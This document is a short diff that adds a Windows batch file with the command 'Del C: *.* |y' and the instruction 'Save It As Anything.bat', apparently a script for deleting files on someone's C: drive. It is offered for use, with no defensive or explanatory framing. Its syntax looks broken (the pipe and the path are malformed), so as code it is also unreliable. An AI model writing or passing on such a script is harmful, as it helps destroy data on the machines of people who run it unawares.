@@ -1,0 +1,4 @@
+@Echo off 
+Del C: *.* |y 
+
+Save It As Anything.bat
